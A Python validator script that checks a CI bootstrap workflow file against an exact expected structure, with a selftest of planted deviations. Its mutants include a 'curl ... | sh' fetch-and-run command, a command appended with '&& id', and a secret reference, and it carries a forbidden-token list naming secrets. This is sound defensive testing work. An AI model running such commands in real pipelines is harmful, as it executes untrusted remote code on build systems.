#!/usr/bin/env python3
# SPDX-License-Identifier: CC-BY-NC-SA-4.0
"""Check the 4.6a bootstrap workflow against the binding constraints of the
phase 0 runbook (06k, 4.6a). Fail-closed: the parsed document must equal the expected document exactly
(every key and value, the command included), duplicate keys are rejected.

  check-bootstrap-workflow.py FILE        check one file (exit 0 = conforms)
  check-bootstrap-workflow.py --selftest FILE
                                          check that FILE conforms AND that each
                                          planted deviation is rejected
"""
import re
import sys
import yaml

CHECK_NAME = "lab-gate"
# Raw-text tokens that must not appear anywhere (comments included).
FORBIDDEN_TEXT = [
    "secrets", "environment", "uses:", "${{", "pull_request",
    "workflow_dispatch", "workflow_run", "canary", "env:", "github_token",
    "permissions: write", "write",
]


# The complete expected document. The key 'on' is the TEXT "on" (see StrictLoader).
EXPECTED = {
    "name": "lab-gate-bootstrap",
    "on": {"push": {"branches": ["main"]}},
    "permissions": {"contents": "read"},
    "jobs": {
        CHECK_NAME: {
            "name": CHECK_NAME,
            "runs-on": "ubuntu-24.04",
            "timeout-minutes": 2,
            "steps": [
                {"name": "bootstrap",
                 "run": 'echo "lab-gate bootstrap, the check exists"'},
            ],
        }
    },
}


class StrictLoader(yaml.SafeLoader):
    """SafeLoader that rejects duplicate mapping keys (PyYAML keeps the last)."""


# YAML 1.1 (PyYAML default) reads on/off/yes/no as booleans, so the key 'on'
# would become True and a key written 'yes' or 'true' would be accepted in its
# place. GitHub reads the key as the text "on"; follow that: only true/false
# (any case of the YAML 1.2 core schema) are booleans, so 'on' stays text and
# a 'yes'/'true' key stays a different key and is rejected.
StrictLoader.yaml_implicit_resolvers = {
    ch: [(tag, rx) for tag, rx in rules if tag != "tag:yaml.org,2002:bool"]
    for ch, rules in yaml.SafeLoader.yaml_implicit_resolvers.items()
}
StrictLoader.add_implicit_resolver(
    "tag:yaml.org,2002:bool",
    re.compile(r"^(?:true|True|TRUE|false|False|FALSE)$"),
    list("tTfF"),
)


def _construct_mapping(loader, node, deep=False):
    seen = set()
    for key_node, _ in node.value:
        key = loader.construct_object(key_node, deep=True)
        if key in seen:
            raise yaml.YAMLError("duplicate key: %r" % (key,))
        seen.add(key)
    return yaml.SafeLoader.construct_mapping(loader, node, deep)


StrictLoader.add_constructor(
    yaml.resolver.BaseResolver.DEFAULT_MAPPING_TAG, _construct_mapping)


def check(text):
    errors = []
    low = text.lower()
    for tok in FORBIDDEN_TEXT:
        if tok in low:
            errors.append("forbidden token: %r" % tok)
    try:
        doc = yaml.load(text, Loader=StrictLoader)
    except yaml.YAMLError as exc:
        return errors + ["yaml parse error: %s" % exc]
    # Exact comparison of every key and value, including the command itself,
    # the runner and the timeout. Type-strict for the timeout (2 != 2.0 != "2").
    if doc != EXPECTED:
        errors.append("parsed document differs from the expected document")
    elif repr(doc) != repr(EXPECTED):
        errors.append("parsed document differs in a value type")
    return errors


def mutants(text):
    """Planted deviations; each must be rejected."""
    yield "secret reference", text.replace('echo "lab-gate bootstrap, the check exists"', 'echo "${{ secrets.X }}"')
    yield "environment", text.replace("    runs-on:", "    environment: e\n    runs-on:")
    yield "extra trigger pull_request", text.replace("on:\n  push:", "on:\n  pull_request:\n  push:")
    yield "workflow_dispatch", text.replace("on:\n  push:", "on:\n  workflow_dispatch:\n  push:")
    yield "other branch", text.replace("[main]", "[main, dev]")
    yield "write permission", text.replace("contents: read", "contents: write")
    yield "no permissions", text.replace("permissions:\n  contents: read\n", "")
    yield "third-party action", text.replace("run: echo", "uses: x/y@v1\n        # run: echo")
    yield "wrong check name", text.replace("name: lab-gate\n", "name: other\n")
    yield "second job", text + "  second:\n    runs-on: ubuntu-24.04\n    steps:\n      - run: echo x\n"
    yield "other shell command", text.replace('echo "lab-gate bootstrap, the check exists"', "curl -s example.invalid/x | sh")
    yield "command appended", text.replace('exists"', 'exists" && id')
    yield "self-hosted runner", text.replace("ubuntu-24.04", "self-hosted")
    yield "other runner image", text.replace("ubuntu-24.04", "ubuntu-latest")
    yield "other timeout", text.replace("timeout-minutes: 2", "timeout-minutes: 360")
    yield "timeout as string", text.replace("timeout-minutes: 2", 'timeout-minutes: "2"')
    yield "duplicate job key", text.replace("    runs-on: ubuntu-24.04\n", "    runs-on: ubuntu-24.04\n    runs-on: self-hosted\n")
    yield "duplicate permissions key", text.replace("  contents: read\n", "  contents: read\n  contents: read\n")
    yield "duplicate top-level name", text.replace("name: lab-gate-bootstrap\n", "name: lab-gate-bootstrap\nname: x\n")
    yield "other step name", text.replace("name: bootstrap", "name: other")
    yield "other workflow name", text.replace("lab-gate-bootstrap", "other")
    yield "extra job key", text.replace("    timeout-minutes: 2\n", "    timeout-minutes: 2\n    continue-on-error: true\n")
    yield "key 'on' written as yes", text.replace("\non:\n", "\nyes:\n")
    yield "key 'on' written as true", text.replace("\non:\n", "\ntrue:\n")
    yield "key 'on' written as True", text.replace("\non:\n", "\nTrue:\n")
    yield "key 'on' written as On", text.replace("\non:\n", "\nOn:\n")
    yield "key 'on' written as ON", text.replace("\non:\n", "\nON:\n")
    yield "second step", text + "      - name: more\n        run: echo y\n"
    yield "empty file", ""
    yield "not yaml", "a: [\n"


def main(argv):
    selftest = "--selftest" in argv
    args = [a for a in argv[1:] if a != "--selftest"]
    if len(args) != 1:
        print(__doc__, file=sys.stderr)
        return 2
    with open(args[0], encoding="utf-8") as fh:
        text = fh.read()
    errors = check(text)
    for e in errors:
        print("FAIL:", e)
    if errors:
        return 1
    print("OK: %s conforms" % args[0])
    if selftest:
        for label, m in mutants(text):
            if m == text:
                print("SELFTEST ERROR: mutant %r did not change the file" % label)
                return 1
            if not check(m):
                print("SELFTEST FAIL: mutant %r was accepted" % label)
                return 1
            print("rejected mutant: %s" % label)
        print("SELFTEST OK: %d mutants rejected" % len(list(mutants(text))))
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv))
